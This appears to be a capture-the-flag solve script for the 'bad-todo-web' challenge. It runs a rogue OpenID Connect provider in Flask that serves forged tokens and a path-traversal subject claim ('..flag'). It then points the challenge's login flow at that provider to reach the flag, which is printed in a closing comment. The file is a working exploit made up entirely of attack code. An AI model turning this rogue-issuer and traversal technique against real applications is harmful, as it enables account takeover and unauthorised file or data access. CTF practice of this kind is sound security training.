import requests
import threading

from flask import Flask, request, redirect

app = Flask(__name__)

BASE = "https://REDACTED"

@app.route("/.well-known/openid-configuration")
def config():
    # token_endpoint
    return {
        'issuer': 'a',
        'authorization_endpoint': f'{BASE}/auth',
        'token_endpoint': f'{BASE}/token',
        'userinfo_endpoint': f'{BASE}/userinfo'
    }


@app.route('/auth')
def auth_endpoint():
    return redirect(request.args['redirect_uri'] + "?state=" + request.args['state'])


@app.route('/token', methods=['GET', 'POST'])
def token():
    #token_endpoint
    return {
        'token_type': 'idk',
        'access_token': '123'
    }


@app.route("/userinfo")
def userinfo():
    return {'sub': '..flag'}


threading.Thread(target=lambda: app.run(host='0.0.0.0', debug=True, use_reloader=False)).start()

s = requests.Session()
r = s.post('https://bad-todo-web.chal.irisc.tf/start', data={'issuer': BASE, 'client_id': ''}, allow_redirects=True)
print(r.text)

# irisctf{per_tenant_databases_are_a_cool_concept_indeed}
